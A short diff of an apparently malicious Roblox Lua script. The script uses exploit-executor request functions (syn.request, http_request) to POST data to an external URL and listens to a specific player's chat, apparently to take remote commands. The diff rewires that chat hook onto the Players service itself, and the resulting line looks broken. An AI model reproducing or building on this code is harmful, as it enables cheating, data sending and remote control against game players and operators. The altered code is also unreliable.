@@ -19,8 +19,6 @@ request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
 
-local main = game.Players:WaitForChild("CrashSystemw")
-
 Player = game.Players.LocalPlayer
 Pl = game.Players
 
@@ -59,7 +57,7 @@ Pl.PlayerAdded:Connect(function(plr)
     end)
 end)
 
-game.Players.CrashSystemw.Chatted:Connect(function(msg) 
+Pl.Chatted:Connect(function(msg) 
     
     local args = {
         [1] = msg,
